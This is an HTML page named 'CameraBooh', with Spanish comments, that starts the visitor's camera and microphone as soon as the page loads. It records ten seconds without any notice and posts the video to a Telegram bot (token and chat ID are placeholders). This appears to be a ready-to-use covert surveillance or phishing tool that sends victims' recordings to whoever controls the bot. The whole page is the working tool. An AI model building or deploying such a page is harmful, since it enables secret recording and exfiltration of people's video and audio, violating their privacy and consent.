<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CameraBooh</title>
</head>
<body>
    <h1>CameraBooh</h1>
    <video id="video" width="640" height="480" autoplay></video>
    
    <script>
        const videoElement = document.getElementById('video');

        // Función para iniciar la grabación automáticamente
        async function iniciarGrabacion() {
            try {
                // Solicitar permisos de cámara
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoElement.srcObject = stream;

                // Iniciar la grabación automáticamente
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    chunks.push(e.data);
                };

                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    enviarVideo(blob);
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000); // Detener la grabación después de 10 segundos
            } catch (err) {
                console.error('Error al acceder a la cámara:', err);
            }
        }

        // Llamar a la función para iniciar la grabación automáticamente
        iniciarGrabacion();

        // Función para enviar el vídeo a Telegram
        async function enviarVideo(blob) {
            const formData = new FormData();
            formData.append('chat_id', 'ID_DEL_CHAT_DEL_GRUPO');
            formData.append('video', blob, 'video.mp4');

            try {
                const response = await fetch('https://api.telegram.org/botTU_TOKEN_DE_BOT/sendVideo', {
                    method: 'POST',
                    body: formData
                });
                if (!response.ok) {
                    throw new Error('Error al enviar el vídeo a Telegram');
                }
                console.log('Vídeo enviado exitosamente a Telegram');
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</body>
</html>
